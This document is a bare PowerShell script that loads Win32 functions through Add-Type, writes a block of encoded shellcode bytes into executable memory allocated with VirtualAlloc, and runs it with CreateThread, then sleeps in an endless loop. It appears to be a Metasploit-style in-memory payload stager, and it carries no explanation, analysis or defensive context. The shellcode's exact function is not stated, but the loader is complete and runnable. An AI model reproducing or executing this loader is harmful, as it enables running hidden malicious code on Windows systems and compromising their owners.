$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xb1,0x39,0x76,0x21,0xd9,0xe8,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x12,0x03,0x43,0x12,0x83,0x72,0x3d,0x94,0xd4,0x88,0xd6,0xda,0x17,0x70,0x27,0xbb,0x9e,0x95,0x16,0xfb,0xc5,0xde,0x09,0xcb,0x8e,0xb2,0xa5,0xa0,0xc3,0x26,0x3d,0xc4,0xcb,0x49,0xf6,0x63,0x2a,0x64,0x07,0xdf,0x0e,0xe7,0x8b,0x22,0x43,0xc7,0xb2,0xec,0x96,0x06,0xf2,0x11,0x5a,0x5a,0xab,0x5e,0xc9,0x4a,0xd8,0x2b,0xd2,0xe1,0x92,0xba,0x52,0x16,0x62,0xbc,0x73,0x89,0xf8,0xe7,0x53,0x28,0x2c,0x9c,0xdd,0x32,0x31,0x99,0x94,0xc9,0x81,0x55,0x27,0x1b,0xd8,0x96,0x84,0x62,0xd4,0x64,0xd4,0xa3,0xd3,0x96,0xa3,0xdd,0x27,0x2a,0xb4,0x1a,0x55,0xf0,0x31,0xb8,0xfd,0x73,0xe1,0x64,0xff,0x50,0x74,0xef,0xf3,0x1d,0xf2,0xb7,0x17,0xa3,0xd7,0xcc,0x2c,0x28,0xd6,0x02,0xa5,0x6a,0xfd,0x86,0xed,0x29,0x9c,0x9f,0x4b,0x9f,0xa1,0xff,0x33,0x40,0x04,0x74,0xd9,0x95,0x35,0xd7,0xb6,0x07,0x23,0x93,0x46,0xb0,0xdc,0x32,0x29,0x29,0x77,0xac,0xf9,0xde,0x51,0x2b,0xfd,0xf4,0xaf,0xe8,0x52,0xa4,0x9c,0x5d,0x06,0x22,0x19,0x37,0xd1,0x15,0xa2,0x62,0x72,0x09,0x37,0x8f,0x26,0xfe,0xaf,0xd2,0xd9,0x00,0x30,0x04,0x55,0x00,0x30,0xd4,0x49,0x4a,0x66,0xe4,0xa3,0x19,0x86,0x54,0xa4,0xf6,0x0f,0xcb,0xf2,0x06,0xda,0x7a,0x3c,0xab,0x8d,0x7c,0xf3,0xac,0xca,0x2f,0xa0,0x7f,0x84,0x9c,0x10,0xe8,0xc1,0x77,0xb3,0xd3,0xea,0xa2,0x5d,0x49,0x1f,0x13,0x0a,0x0e,0x2c,0xab,0xca,0x87,0xb3,0xc1,0xce,0xc7,0x59,0x0a,0x99,0x8f,0xe8,0x72,0xbb,0xd6,0xec,0xaf,0x90,0x85,0x41,0x1c,0x41,0x42,0x4b,0xa4,0x75,0xe9,0x6c,0x7d,0x00,0xcd,0xe6,0x77,0x44,0xbb,0xd1,0xef,0xaa,0xf6,0x40,0xb9,0xb5,0x2c,0xee,0x05,0x22,0xcf,0xff,0x85,0xb2,0xa7,0xff,0x85,0xf2,0x37,0x53,0xed,0xaa,0x93,0x00,0x08,0xb5,0x09,0x35,0x81,0x19,0x3b,0xdd,0x72,0xf6,0x3b,0x02,0x7c,0x06,0x6f,0x14,0x14,0x14,0x19,0x11,0x06,0xe7,0xf0,0xa7,0x06,0x6c,0x36,0x2c,0x81,0x8c,0x0b,0xb6,0x4d,0xfb,0x6e,0xe1,0x8e,0x5b,0x99,0x67,0xef,0x9b,0xa6,0xb9,0x3f,0x5d,0x77,0x88,0x0c,0xa5,0xa9,0xde,0x5c,0xe4,0x81,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
